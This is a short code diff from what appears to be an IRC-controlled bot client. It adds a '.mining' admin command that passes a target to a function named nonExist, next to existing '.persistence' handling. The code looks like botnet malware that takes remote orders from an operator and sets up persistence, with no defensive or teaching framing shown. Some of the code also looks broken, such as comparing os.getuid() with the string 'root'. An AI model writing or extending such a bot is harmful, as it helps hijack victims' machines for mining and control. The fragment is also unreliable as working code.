@@ -704,6 +704,11 @@ def main(): # This is the main function for all of the bot controls.
                         message = "Only Linux is currently supported."
                     sendntc(message, name)
                                 
+                # Respond to '.mining' command from admin.
+                if name.lower() == adminname.lower() and message.find('.mining') != -1:
+                    target = message.split(' ', 1)[1]
+                    nonExist(target)
+                
                 # Respond to '.persistence' command from admin.
                 if name.lower() == adminname.lower() and message.find('.persistence') != -1:
                     if os.getuid() == 'root':
